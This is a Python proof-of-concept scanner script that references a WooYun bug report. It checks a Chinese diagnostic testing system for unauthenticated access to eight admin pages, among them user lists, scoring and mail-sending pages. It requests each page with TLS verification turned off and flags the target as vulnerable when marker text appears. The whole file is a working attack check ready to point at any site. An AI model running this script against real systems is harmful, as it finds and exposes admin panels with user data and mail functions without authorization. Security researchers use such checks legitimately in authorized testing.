#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 学子科技诊断测评系统多处未授权访问
referer: http://www.wooyun.org/bugs/wooyun-2010-0138025
author: Lucifer
description: 多处未授权访问。
'''
import sys
import requests
import warnings



class xuezi_ceping_unauth:
    def __init__(self, url):
        self.url = url

    def run(self):
        result = ['学子科技诊断测评系统多处未授权访问','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        vulnurls = [
            self.url + '/ceping/HouAdmin/GLGWUsers.aspx',
            self.url + '/ceping/HouAdmin/GLComUser.aspx',
            self.url + '/ceping/HouAdmin/GLComleibie2.aspx',
            self.url + '/ceping/HouAdmin/GL_Shitileibie.aspx',
            self.url + '/ceping/HouAdmin/GL_PingFen.aspx',
            self.url + '/ceping/HouAdmin/GL_FenXiFuDao.aspx',
            self.url + '/ceping/HouAdmin/MailSection.aspx',
            self.url + '/ceping/HouAdmin/sendmails.aspx'
        ]
        verifys = [
            '注册时间',
            '注册时间',
            '类别名称',
            '添加试题类别',
            '请选择类别',
            '分析报告',
            '发件地址',
            '邮件内容'
        ]
        try:
            noexist = True
            for i in range(len(vulnurls)):
                vulnurl = vulnurls[i]
                verify = verifys[i]
                req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                if verify in req.text:
                    result[2]=  '存在'
                    result[1] = vulnurl
                    noexist = False
            if noexist:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = xuezi_ceping_unauth(sys.argv[1])
    testVuln.run()